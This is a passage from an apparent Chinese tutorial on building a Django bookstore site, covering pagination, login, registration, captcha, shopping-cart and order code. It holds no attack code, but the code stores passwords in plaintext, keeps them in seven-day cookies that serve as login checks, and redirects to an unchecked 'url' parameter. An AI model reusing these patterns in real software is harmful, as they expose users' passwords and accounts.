&#125;&#125;&amp;cate1=&#123;&#123; cate1 &#125;&#125;&amp;cate2=&#123;&#123; cate2 &#125;&#125;&quot; class=&quot;current&quot;&gt;&#123;&#123; foo &#125;&#125;&lt;/a&gt;&lt;/li&gt; &#123;% else %&#125; &lt;li&gt;&lt;a href=&quot;&#123;% url &#x27;book:booklist&#x27; %&#125;?num=&#123;&#123; foo &#125;&#125;&amp;cate1=&#123;&#123; cate1 &#125;&#125;&amp;cate2=&#123;&#123; cate2 &#125;&#125;&quot; class=&quot;null&quot;&gt;&#123;&#123; foo &#125;&#125;&lt;/a&gt;&lt;/li&gt; &#123;% endif %&#125; &#123;% endfor %&#125; &lt;li&gt;&lt;span&gt;...&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt; &lt;li class=&quot;next&quot;&gt; &#123;% if page.has_next %&#125; &lt;a href=&quot;&#123;% url &#x27;book:booklist&#x27; %&#125;?num=&#123;&#123; page.next_page_number &#125;&#125;&amp;cate1=&#123;&#123; cate1 &#125;&#125;&amp;cate2=&#123;&#123; cate2 &#125;&#125;&quot;&gt; 下一页&lt;/a&gt; &#123;% endif %&#125;&lt;/li&gt; &lt;/li&gt;&lt;li class=&quot;page_input&quot;&gt;&lt;span&gt;共&#123;&#123; page.paginator.num_pages &#125;&#125;页 到第&lt;/span&gt; &lt;input id=&quot;t__cp&quot; type=&quot;text&quot; class=&quot;number&quot; name=&quot;num&quot; value=&quot;&#123;&#123; page.number &#125;&#125;&quot;&gt; &lt;span&gt;页&lt;/span&gt; &lt;input class=&quot;button&quot; id=&quot;click_get_page&quot; value=&quot;确定&quot; type=&quot;button&quot; onclick=&quot;f()&quot;&gt;&lt;/li&gt;&lt;/ul&gt;&lt;script type=&quot;text/javascript&quot;&gt; function f() &#123; num = $(&#x27;#t__cp&#x27;).val(); console.log(num); if (num &lt; 1) &#123; alert(&#x27;超出下限&#x27;) &#125; else if (num &gt; &#123;&#123; page.paginator.num_pages &#125;&#125;) &#123; alert(&#x27;超出上限&#x27;) &#125; else &#123; location.href = &#x27;&#123;% url &#x27;book:booklist&#x27; %&#125;?cate1=&#123;&#123; cate1 &#125;&#125;&amp;cate2=&#123;&#123; cate2 &#125;&#125;&amp;num=&#x27; + num &#125; &#125;&lt;/script&gt; 五.登录和注册123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120def regist(request): url = request.GET.get(&#x27;url&#x27;) print(url) return render(request, &#x27;user/register.html&#x27;, &#123;&quot;url&quot;: url&#125;)def login(request): # 判断是否有登录状态 user_name = request.COOKIES.get(&#x27;txtUsername&#x27;) user_pwd = request.COOKIES.get(&#x27;txtPassword&#x27;) url = request.GET.get(&#x27;url&#x27;) print(url, 22222) if url == None: url = &quot;http://127.0.0.1:8000/index/&quot; req = TUser.objects.filter(user_name=user_name, user_pwd=user_pwd) if req: request.session[&#x27;login&#x27;] = &#x27;ok&#x27; return render(request, &#x27;user/login.html&#x27;, &#123;&quot;txtUsername&quot;: user_name, &quot;txtPassword&quot;: user_pwd, &#x27;url&#x27;: url&#125;) return render(request, &#x27;user/login.html&#x27;)def regist_ok(request): url = request.GET.get(&#x27;url&#x27;) print(url) txt_username = request.GET.get(&quot;txt_username&quot;) return render(request, &#x27;user/register ok.html&#x27;, &#123;&quot;txt_username&quot;: txt_username, &quot;url&quot;: url&#125;)# 生成验证码def getCaptcha(request): # 生成img对象 img = ImageCaptcha() code = random.sample(string.ascii_uppercase + string.ascii_lowercase + string.digits, 4) # 拼接字符,通过session传递验证码 random_code = &#x27;&#x27;.join(code) request.session[&#x27;code&#x27;] = random_code # 生成验证码图片 data = img.generate(random_code) return HttpResponse(data, &#x27;image/png&#x27;)# 验证码校验def check_code(request): txt_vcode = request.POST.get(&quot;txt_vcode&quot;) # 验证码 code = request.session[&#x27;code&#x27;] print(code) if code.lower() == txt_vcode.lower(): return JsonResponse(&#123;&quot;msg&quot;: &quot;验证码正确&quot;, &quot;error&quot;: 0&#125;) return JsonResponse(&#123;&quot;msg&quot;: &quot;验证码错误&quot;, &quot;error&quot;: 1&#125;)def regist_logic(request): url = request.GET.get(&#x27;url&#x27;) print(url) txt_username = request.POST.get(&quot;txt_username&quot;) txt_password = request.POST.get(&quot;txt_password&quot;) txt_repassword = request.POST.get(&quot;txt_repassword&quot;) txt_vcode = request.POST.get(&quot;txt_vcode&quot;) # 验证码 chb_agreement = request.POST.get(&quot;chb_agreement&quot;) # 霸王条款 code = request.session[&#x27;code&#x27;] try: with transaction.atomic(): if txt_username == &#x27;&#x27; or txt_password == &#x27;&#x27; or txt_repassword == &#x27;&#x27; or txt_vcode == &#x27;&#x27;: 10 / 0 if code.lower() == txt_vcode.lower(): res = TUser.objects.filter(user_name=txt_username) if res: return JsonResponse(&#123;&quot;msg&quot;: &quot;用户已存在&quot;, &quot;error&quot;: 0&#125;) elif txt_password == txt_repassword: resp = JsonResponse(&#123;&quot;msg&quot;: &quot;创建成功&quot;, &quot;error&quot;: 1, &quot;url&quot;: url&#125;) TUser.objects.create(user_name=txt_username, user_pwd=txt_password) resp.set_cookie(&#x27;txtUsername&#x27;, txt_username, max_age=7 * 24 * 3600) resp.set_cookie(&#x27;txtPassword&#x27;, txt_password, max_age=7 * 24 * 3600) return resp else: return JsonResponse(&#123;&quot;msg&quot;: &quot;两次密码不一致&quot;, &quot;error&quot;: 2&#125;) return JsonResponse(&#123;&quot;msg&quot;: &quot;验证码错误&quot;, &quot;error&quot;: 3&#125;) except Exception as e: traceback.print_exc() print(e) return JsonResponse(&#123;&quot;msg&quot;: &quot;输入数据非法&quot;, &quot;error&quot;: 4&#125;)# 检查用户名def check_username(request): txtUsername = request.GET.get(&quot;txtUsername&quot;) print(txtUsername, &quot;检查用户名是否存在&quot;) res = TUser.objects.filter(user_name=txtUsername) if res: return JsonResponse(&#123;&quot;msg&quot;: &quot;用户名存在&quot;, &quot;error&quot;: 0&#125;) return JsonResponse(&#123;&quot;msg&quot;: &quot;该用户名不存在请检查!&quot;, &quot;error&quot;: 1&#125;)def login_logic(request): txtUsername = request.POST.get(&quot;txtUsername&quot;) txtPassword = request.POST.get(&quot;txtPassword&quot;) txtVerifyCode = request.POST.get(&quot;txtVerifyCode&quot;) code = request.session[&#x27;code&#x27;] url = request.GET.get(&#x27;url&#x27;) autologin = request.POST.get(&quot;autologin&quot;) # 是否勾选免登录 try: if txtUsername == &#x27;&#x27; or txtPassword == &#x27;&#x27; or txtVerifyCode == &#x27;&#x27;: 10 / 0 if code.lower() == txtVerifyCode.lower(): res = TUser.objects.filter(user_name=txtUsername, user_pwd=txtPassword) if res: request.session[&#x27;login&#x27;] = &#x27;ok&#x27; resp = JsonResponse(&#123;&quot;msg&quot;: &quot;登陆成功!&quot;, &quot;error&quot;: 0, &quot;url&quot;: url&#125;) if autologin: resp.set_cookie(&#x27;txtUsername&#x27;, txtUsername, max_age=7 * 24 * 3600) resp.set_cookie(&#x27;txtPassword&#x27;, txtPassword, max_age=7 * 24 * 3600) return resp else: return JsonResponse(&#123;&quot;msg&quot;: &quot;用户名或密码错误!&quot;, &quot;error&quot;: 1&#125;) else: return JsonResponse(&#123;&quot;msg&quot;: &quot;验证码错误&quot;, &quot;erro&quot;: 2&#125;) except Exception as e: print(e) traceback.print_exc() return JsonResponse(&#123;&quot;msg&quot;: &quot;请输入有效数据&quot;, &quot;error&quot;: 3&#125;)# 退出登陆状态,删除sessiondef exit(request): username = request.GET.get(&quot;username&quot;) # 获取到需要退出的用户名 request.session.flush() resp = JsonResponse(&#123;&quot;msg&quot;: &quot;退出成功!&quot;, &quot;error&quot;: 0&#125;) resp.delete_cookie(&#x27;txtUsername&#x27;) resp.delete_cookie(&#x27;txtPassword&#x27;) if username: return resp else: return JsonResponse(&#123;&quot;msg&quot;: &quot;发生错误!&quot;, &quot;error&quot;: 1&#125;) regist.javascript123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138&lt;script src=&quot;/static/js/jquery.1.4.2-min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt; &#123;# 验证码刷新 #&#125; $(function () &#123; $(&quot;#vcodeImgBtn&quot;).click(function () &#123; $(&quot;#imgVcode&quot;)[0].src = &quot;&#123;% url &#x27;user:getCaptcha&#x27; %&#125;?&quot;+new Date().getTime(); &#125;); $(&quot;#imgVcode&quot;).click(function () &#123; $(&quot;#imgVcode&quot;)[0].src = &quot;&#123;% url &#x27;user:getCaptcha&#x27; %&#125;?&quot;+new Date().getTime(); &#125;); &#123;#table下的所有的收入框失焦验证信息#&#125; $(&#x27;#txt_username&#x27;).blur(function () &#123; var re_phone = /^1[34578]\\d&#123;9&#125;$/; var re_email = /^[a-zA-Z0-9_-]+@([a-zA-Z0-9_-])+\\.[A-Za-z]&#123;2,3&#125;/; if (re_phone.test($(&quot;#txt_username&quot;).val()) || re_email.test($(&quot;#txt_username&quot;).val())) &#123; $(&quot;#spn_username_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_username_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_yes&#x27;); $(&quot;#spn_username_ok&quot;).html(&#x27;&#x27;); return true &#125;else &#123; $(&quot;#spn_username_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_username_ok&quot;).attr(&#x27;class&#x27;,&#x27;&#x27;); $(&quot;#spn_username_ok&quot;).html(&#x27;请检查手机号或邮箱的格式！&#x27;); return false &#125; &#125;); &#123;# 密码强弱 #&#125; $(&#x27;#txt_password&#x27;).blur(function () &#123; var re_medium = /^.*(?=.&#123;6,&#125;)(?=.*\\d)(?=.*[A-Za-z]).*$/; var re_week = /^.*(?=.&#123;6,&#125;)(?=.*\\d).*$|^.*(?=.&#123;6,&#125;)(?=.*[A-Za-z]).*$/; var re_strong = /^.*(?=.&#123;6,&#125;)(?=.*\\d)(?=.*[A-Za-z])(?=.*[!@#$%^&amp;*?]).*$/; var pwd = $(&quot;#txt_password&quot;).val(); if (pwd.length &lt; 6)&#123; $(&quot;#spn_epassword_ok&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spn_epassword_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_wrong&#x27;); $(&quot;#spnPwdStrong2&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spnPwdStrong1&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spnPwdStrong3&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#J_tipPassword&quot;).html(&quot;密码长度小于6位&quot;) return false &#125; else if (re_strong.test(pwd)) &#123; $(&quot;#spnPwdStrong3&quot;).css(&#x27;display&#x27;, &#x27;inline-block&#x27;); $(&quot;#spnPwdStrong2&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spnPwdStrong1&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#J_tipPassword&quot;).html(&#x27;&#x27;); $(&quot;#spn_epassword_ok&quot;).css(&#x27;display&#x27;, &#x27;inline-block&#x27;); $(&quot;#spn_epassword_ok&quot;).attr(&#x27;class&#x27;, &#x27;icon_yes&#x27;); return true &#125;else if (re_medium.test(pwd)) &#123; $(&quot;#spnPwdStrong2&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spnPwdStrong1&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spnPwdStrong3&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#J_tipPassword&quot;).html(&#x27;&#x27;); $(&quot;#spn_epassword_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_epassword_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_yes&#x27;); return true &#125;else if (re_week.test(pwd))&#123; $(&quot;#spnPwdStrong1&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spnPwdStrong2&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#spnPwdStrong3&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $(&quot;#J_tipPassword&quot;).html(&#x27;&#x27;); $(&quot;#spn_epassword_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_epassword_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_yes&#x27;); return true &#125; &#125;); &#123;# 检验密码 #&#125; $(&quot;#txt_repassword&quot;).blur(function () &#123; var pwd = $(&quot;#txt_password&quot;).val(); var repwd = $(&quot;#txt_repassword&quot;).val(); if (repwd==pwd &amp;&amp; repwd !==&#x27;&#x27;)&#123; $(&quot;#spn_repassword_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_repassword_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_yes&#x27;); return true &#125;else &#123; $(&quot;#spn_repassword_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_repassword_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_wrong&#x27;); return false &#125; &#125;); &#123;# 验证码校验 #&#125; $(&quot;#txt_vcode&quot;).blur(function () &#123; $.ajax(&#123; type: &quot;post&quot;, url: &quot;&#123;% url &#x27;user:check_code&#x27; %&#125;&quot;, data: &quot;txt_vcode=&quot;+$(&quot;#txt_vcode&quot;).val()+&quot;&amp;csrfmiddlewaretoken=&#123;&#123; csrf_token &#125;&#125;&quot;, success: function (msg) &#123; console.log(msg); if (msg.error == 1) &#123; console.log(&#x27;验证码错误&#x27;); $(&quot;#spn_vcode_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_vcode_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_wrong pin_i&#x27;); $(&quot;#J_tipVcode&quot;).html(&#x27;验证码输入不正确!&#x27;); return false &#125;else &#123; console.log(&#x27;验证码正确&#x27;); $(&quot;#spn_vcode_ok&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#spn_vcode_ok&quot;).attr(&#x27;class&#x27;,&#x27;icon_yes pin_i&#x27;); $(&quot;#J_tipVcode&quot;).html(&#x27;&#x27;); return true &#125; &#125; &#125;); &#125;); &#123;# 霸王条款 #&#125; $(&quot;#J_submitRegister&quot;).click(function () &#123; var chb_agreement = $(&quot;#chb_agreement&quot;); if (chb_agreement.attr(&#x27;checked&#x27;))&#123; $.ajax(&#123; type: &quot;POST&quot;, url: &quot;&#123;% url &#x27;user:regist_logic&#x27; %&#125;&quot;, data: &quot;txt_username=&quot;+$(&quot;#txt_username&quot;).val() +&quot;&amp;txt_password=&quot;+$(&quot;#txt_password&quot;).val()+&quot;&amp;txt_repassword=&quot;+$(&quot;#txt_repassword&quot;).val()+&quot;&amp;txt_vcode=&quot;+$(&quot;#txt_vcode&quot;).val()+&quot;&amp;chb_agreement=&quot;+$(&quot;#chb_agreement&quot;).val()+&quot;&amp;csrfmiddlewaretoken=&#123;&#123; csrf_token &#125;&#125;&quot;, success:function (msg) &#123; console.log(msg); if (msg.error == 0)&#123; $(&quot;#J_tipUsername&quot;)[0].innerHTML=&#x27;此手机号已注册，请更换其它手机号，或使用该&lt;a href=&quot;&#123;% url &#x27;user:login&#x27; %&#125;&quot; name=&quot;mobile_login _link&quot; class=&quot;more&quot;&gt;手机号登录&lt;/a&gt;&#x27; &#125;else if (msg.error == 1)&#123; location.href = &quot;&#123;% url &#x27;user:regist_ok&#x27; %&#125;?txt_username=&quot;+$(&quot;#txt_username&quot;).val(); &#125;else if (msg.error == 2)&#123; $(&quot;#J_tipSurePassword&quot;)[0].innerHTML=&#x27;两次密码验证不一致,请重新输入!&#x27; &#125;else if (msg.error == 3)&#123; $(&quot;#J_tipVcode&quot;)[0].innerHTML = &#x27;验证码验证不正确&#x27; &#125;else if (msg.error == 4)&#123; alert(msg.msg) &#125; &#125; &#125;) &#125;else &#123; alert(&#x27;请阅读并同意本网站协议!&#x27;) &#125; &#125;) &#125;); &lt;/script&gt; login.javascript123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101&lt;script type=&quot;text/javascript&quot;&gt; $(function () &#123; $(&quot;#imgVcode&quot;).click(function () &#123; $(&quot;#imgVcode&quot;)[0].src = &quot;&#123;% url &#x27;user:getCaptcha&#x27; %&#125;?&quot;+new Date().getTime(); &#125;); $(&quot;#vcodeImgBtn&quot;).click(function () &#123; $(&quot;#imgVcode&quot;)[0].src = &quot;&#123;% url &#x27;user:getCaptcha&#x27; %&#125;?&quot;+new Date().getTime(); &#125;); &#123;# 校验登录名是否为邮箱或者手机号 #&#125; $(&#x27;#txtUsername&#x27;).blur(function () &#123; var re_phone = /^1[34578]\\d&#123;9&#125;$/; var re_email = /^[a-zA-Z0-9_-]+@([a-zA-Z0-9_-])+\\.[A-Za-z]&#123;2,3&#125;/; var txtUsername = $(&quot;#txtUsername&quot;).val(); if (re_phone.test(txtUsername) || re_email.test(txtUsername)) &#123; $(&quot;#liDivErrorMessage&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); $.ajax(&#123; type: &quot;get&quot;, url: &quot;&#123;% url &#x27;user:check_username&#x27; %&#125;&quot;, data: &quot;txtUsername=&quot;+$(&quot;#txtUsername&quot;).val(), success: function (msg) &#123; console.log(msg,&#x27;判断用户是否存在&#x27;); if (msg.error == 0)&#123; $(&quot;#liDivErrorMessage&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); &#125;else &#123; $(&quot;#liDivErrorMessage&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#liDivErrorMessage&quot;).html(msg.msg) &#125; &#125; &#125;); &#125;else &#123; $(&quot;#liDivErrorMessage&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); $(&quot;#liDivErrorMessage&quot;).html(&quot;请输入邮箱/昵称/手机号码&quot;) &#125; &#125;); &#123;# 密码校验 #&#125; $(&quot;#txtPassword&quot;).blur(function () &#123; var re_week = /^.*(?=.&#123;6,&#125;)(?=.*\\d).*$|^.*(?=.&#123;6,&#125;)(?=.*[A-Za-z]).*$/; var txtPassword = $(&quot;#txtPassword&quot;).val(); if (re_week.test(txtPassword))&#123; $(&quot;#login_password_error&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); &#125;else &#123; $(&quot;#login_password_error&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); &#125; &#125;); &#123;# 验证码校验 #&#125; $(&quot;#txtVerifyCode&quot;).blur(function () &#123; $.ajax(&#123; type: &quot;post&quot;, url: &quot;&#123;% url &#x27;user:check_code&#x27; %&#125;&quot;, data: &quot;txt_vcode=&quot;+$(&quot;#txtVerifyCode&quot;).val()+&quot;&amp;csrfmiddlewaretoken=&#123;&#123; csrf_token &#125;&#125;&quot;, success: function (msg) &#123; if (msg.error == 1) &#123; console.log(&#x27;验证码错误&#x27;); $(&quot;#vcode_mindstyle&quot;).html(&#x27;验证码错误&#x27;) &#125;else &#123; console.log(&#x27;验证码正确&#x27;); $(&quot;#vcode_mindstyle&quot;).html(&#x27;&#x27;) &#125; &#125; &#125;); &#125;); &#123;# 七天免登录 #&#125; $(&quot;#autologin&quot;).click(function () &#123; var autologin = $(&quot;#autologin&quot;).attr(&#x27;checked&#x27;); if (autologin)&#123; console.log(&#x27;免登录&#x27;); $(&quot;#s1&quot;).css(&quot;display&quot;,&quot;inline-block&quot;); $(&quot;#s2&quot;).css(&quot;display&quot;,&quot;none&quot;); &#125;else &#123; console.log(&#x27;需要登陆&#x27;); $(&quot;#s2&quot;).css(&quot;display&quot;,&quot;inline-block&quot;); $(&quot;#s1&quot;).css(&quot;display&quot;,&quot;none&quot;); &#125; &#125;); &#123;# 点击登录按钮 #&#125; $(&quot;#submitLoginBtn&quot;).click(function () &#123; $.ajax(&#123; type: &quot;POST&quot;, url: &quot;&#123;% url &#x27;user:login_logic&#x27; %&#125;&quot;, data: &quot;txtUsername=&quot;+$(&quot;#txtUsername&quot;).val()+&quot;&amp;txtPassword=&quot;+$(&quot;#txtPassword&quot;).val()+&quot;&amp;txtVerifyCode=&quot;+$(&quot;#txtVerifyCode&quot;).val()+&quot;&amp;autologin=&quot;+$(&quot;#autologin&quot;).val()+&quot;&amp;csrfmiddlewaretoken=&#123;&#123; csrf_token &#125;&#125;&quot;, success:function (msg) &#123; if (msg.error == 0)&#123; location.href = &quot;&#123;&#123; url &#125;&#125;&quot;; &#125;else if (msg.error == 1)&#123; alert(msg.msg) &#125;else if (msg.error ==2)&#123; alert(msg.msg) &#125;else if (msg.error == 3)&#123; alert(msg.msg) &#125; &#125; &#125;) &#125;); &#123;# 注册跳转 #&#125; $(&quot;#J_loginToRegister&quot;).click(function () &#123; var url = location.href; console.log(url); location.href = &quot;&#123;% url &#x27;user:regist&#x27; %&#125;?url=&quot;+url; &#125;); &#125;); &lt;/script&gt; 六.购物车实现以及订单实现通过构建购物车对象,实现添加,删除,修改,查询123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248import time,uuid,datetimefrom django.db import transactionfrom django.http import JsonResponse, HttpResponsefrom django.shortcuts import render, redirectfrom user.models import TCar, TBook, TUser, TOrder, TAddress, TOrderItem# Create your views here.# 面向对象实现购物车,方法:添加,删除,修改,查询class Book: def __init__(self, id, count): book = TBook.objects.get(pk=id) self.id = id self.count = count self.new_price = book.new_price self.picture = book.picture self.book_name = book.book_name def totalprice(self): return round(float(self.new_price) * float(self.count), 2)class Car: def __init__(self): self.book_list = [] # 空列表 self.index = 0 def add_book(self, id, count=1): book = self.get_book(id) # 查询bookid是否存在 if book: book.count = int(book.count) + int(count) # 存在直接修改数量 else: # 不存在创建book对象存放 book = Book(id=id, count=count) self.book_list.append(book) # 根据id查询某本书是否存在购物车 def get_book(self, id): for book in self.book_list: if book.id == id: return book # 根据id删除 def remove_book(self, id): book = self.get_book(id) self.book_list.remove(book) def __iter__(self): self.index = 0 return self def __next__(self): if self.index &lt; len(self.book_list): item = self.book_list[self.index] self.index += 1 return item else: raise StopIteration def __len__(self): return len(self.book_list)def rem_book(request): book_id = request.GET.get(&quot;id&quot;) # 书的id car = request.session.get(&#x27;car&#x27;) # 判断是否有登录状态 user_name = request.COOKIES.get(&#x27;txtUsername&#x27;) user_pwd = request.COOKIES.get(&#x27;txtPassword&#x27;) req = TUser.objects.filter(user_name=user_name, user_pwd=user_pwd) if req: id = TUser.objects.get(user_name=user_name) # 用户id try: with transaction.atomic(): car = TCar.objects.filter(user_id=id) # 用户的购物车 book_item = TCar.objects.get(book_id=book_id) # 需要删除的book对象 print(book_item) book_item.delete() sum_price = 0 for i in car: sum_price += round(float(i.book.new_price) * float(i.count), 2) return JsonResponse(&#123;&quot;error&quot;: 0, &quot;msg&quot;: &quot;删除成功&quot;, &quot;sum_price&quot;: sum_price&#125;) return JsonResponse(&#123;&quot;error&quot;: 1, &quot;msg&quot;: &quot;删除失败&quot;&#125;) except Exception as e: print(e) return JsonResponse(&#123;&quot;error&quot;: 1, &quot;msg&quot;: &quot;删除失败&quot;&#125;) else: if car: totalprice = 0 sum_price = 0 for i in car: totalprice = round(float(i.new_price) * float(i.count), 2) sum_price += round(float(i.new_price) * float(i.count), 2) with transaction.atomic(): car.remove_book(book_id) request.session[&#x27;car&#x27;] = car return JsonResponse(&#123;&quot;error&quot;: 0, &quot;msg&quot;: &quot;删除成功&quot;, &quot;sum_price&quot;: sum_price, &quot;totalprice&quot;: totalprice&#125;) return JsonResponse(&#123;&quot;error&quot;: 1, &quot;msg&quot;: &quot;删除失败&quot;&#125;)def add_car(request): book_id = request.GET.get(&quot;bookid&quot;) book_num = request.GET.get(&quot;booknum&quot;) book_num1 = request.GET.get(&quot;booknum1&quot;) # 数量失焦的返回值 user_name = request.COOKIES.get(&#x27;txtUsername&#x27;) user_pwd = request.COOKIES.get(&#x27;txtPassword&#x27;) car = request.session.get(&#x27;car&#x27;) # 存放的未登陆的car # 判断是否有登录状态 req = TUser.objects.filter(user_name=user_name, user_pwd=user_pwd) sum_price = 0 totalprice = 0 if req: id = TUser.objects.get(user_name=user_name) # 用户id car = TCar.objects.filter(user_id=id) # 用户的购物车 if car: # 判断book是否存在 book_item = TCar.objects.filter(book_id=book_id) if book_item: # 存在book if book_num1: # 失焦直接赋值给count book_item[0].count = int(book_num1) book_item[0].save() totalprice = book_item[0].totalprice() else: book_item[0].count += int(book_num) book_item[0].save() else: with transaction.atomic(): TCar.objects.create(book_id=book_id, count=book_num, user_id=id.id) else: with transaction.atomic(): TCar.objects.create(book_id=book_id, count=book_num, user_id=id.id) for i in car: sum_price += round(float(i.book.new_price) * float(i.count), 2) return JsonResponse(&#123;&quot;msg&quot;: &quot;添加购物车成功!快去看看吧!&quot;, &quot;error&quot;: 0, &quot;totalprice&quot;: totalprice, &quot;sum_price&quot;: sum_price&#125;) else: if car: pass else: car = Car() car.add_book(book_id, int(book_num)) request.session[&#x27;car&#x27;] = car sum_price = 0 # 总计 totalprice = 0 # 小计 for book in car.book_list: if int(book.id) == int(book_id): totalprice = round(float(book.new_price) * float(book.count), 2) sum_price += round(float(book.new_price) * float(book.count), 2) return JsonResponse(&#123;&quot;msg&quot;: &quot;添加购物车成功!快去看看吧!&quot;, &quot;error&quot;: 0, &quot;sum_price&quot;: sum_price, &quot;totalprice&quot;: totalprice&#125;)def car(request): # 判断是否有登录状态 user_name = request.COOKIES.get(&#x27;txtUsername&#x27;) user_pwd = request.COOKIES.get(&#x27;txtPassword&#x27;) req = TUser.objects.filter(user_name=user_name, user_pwd=user_pwd) car = request.session.get(&#x27;car&#x27;) # 存放的未登陆的car if req: request.session[&#x27;login&#x27;] = &#x27;ok&#x27; # 将session中的数据迁移到购物车表中，相同数据应该合并数量，同时还需要清空session try: with transaction.atomic(): id = TUser.objects.get(user_name=user_name) # 用户id if car: # 判断book是否存在 for i in car: book_item = TCar.objects.filter(book_id=i.id) if book_item: book_item[0].count += int(i.count) book_item[0].save() print(i.id, i.count) else: with transaction.atomic(): TCar.objects.create(book_id=i.id, count=i.count, user_id=id.id) request.session.flush() else: with transaction.atomic(): car = TCar.objects.filter(user_id=id) sum_price = 0 # 总计 for i in car: sum_price += round(float(i.book.new_price) * float(i.count), 2) return render(request, &#x27;car/car.html&#x27;, &#123;&quot;car&quot;: car, &quot;sum_price&quot;: sum_price, &quot;user_name&quot;: user_name&#125;) except Exception as e: print(e) else: if car: totalprice = 0 sum_price = 0 # 总计 for i in car: totalprice = round(float(i.new_price) * float(i.count), 2) sum_price += round(float(i.new_price) * float(i.count), 2) return render(request, &#x27;car/car.html&#x27;, &#123;&quot;car&quot;: car, &quot;totalprice&quot;: totalprice, &quot;sum_price&quot;: sum_price, &#125;) return render(request, &#x27;car/car.html&#x27;)def order(request): # 判断是否有登录状态 user_name = request.COOKIES.get(&#x27;txtUsername&#x27;) user_pwd = request.COOKIES.get(&#x27;txtPassword&#x27;) req = TUser.objects.filter(user_name=user_name, user_pwd=user_pwd) sum_price = 0 if req: id = TUser.objects.get(user_name=user_name) # 用户id car = TCar.objects.filter(user_id=id) with transaction.atomic(): address = TAddress.objects.filter(user_id=id) for i in car: sum_price += round(float(i.book.new_price) * float(i.count), 2) return render(request, &quot;car/indent.html&quot;, &#123;&quot;address&quot;: address, &quot;car&quot;: car, &quot;sum_price&quot;: sum_price, &quot;user_name&quot;: user_name&#125;) return redirect(&quot;user:login&quot;)def order_ok(request): user_name = request.COOKIES.get(&#x27;txtUsername&#x27;) id = TUser.objects.get(user_name=user_name) # 用户id car = TCar.objects.filter(user_id=id) # 用户的car sum_price = 0 # 总计 # 获取到提交订单的地址 address = request.GET.get(&quot;address&quot;) address_id = TAddress.objects.filter(address=address)[0] # 生成订单号 order_id = str(time.strftime(&#x27;%Y%m%d%H%M%S&#x27;, time.localtime(time.time()))) + str(time.time()).replace(&#x27;.&#x27;, &#x27;&#x27;)[-7:] create_time = datetime.datetime.now().strftime(&#x27;%Y-%m-%d&#x27;) # 订单项 for i in car: sum_price += round(float(i.book.new_price) * float(i.count), 2) with transaction.atomic(): order = TOrder.objects.create(order_id=order_id, create_time=create_time, price=sum_price, address_id=address_id.id, user_id=id.id) count = 0 for i in car: with transaction.atomic(): order_item = TOrderItem.objects.create(count=i.count, book_id=i.id, order_id=order.id) count += i.count i.delete() return render(request, &#x27;car/indent ok.html&#x27;, &#123;&quot;user_name&quot;: user_name, &quot;order&quot;: order, &quot;count&quot;: count, &quot;order_item&quot;: order_item, &quot;address&quot;: address_id&#125;)def order_submit(request): user_name = request.COOKIES.get(&#x27;txtUsername&#x27;) id = TUser.objects.get(user_name=user_name) # 用户 t_address = TAddress.objects.filter(user_id=id) # 用户的地址 ship_man = request.POST.get(&quot;ship_man&quot;) address = request.POST.get(&quot;address&quot;) addr_mobile = request.POST.get(&quot;addr_mobile&quot;) cellphone = request.POST.get(&quot;cellphone&quot;) post = request.POST.get(&quot;post&quot;) print(ship_man, address, addr_mobile, cellphone, post) # 判断地址是否存在,不存在添加 if t_address[0].address == address: return 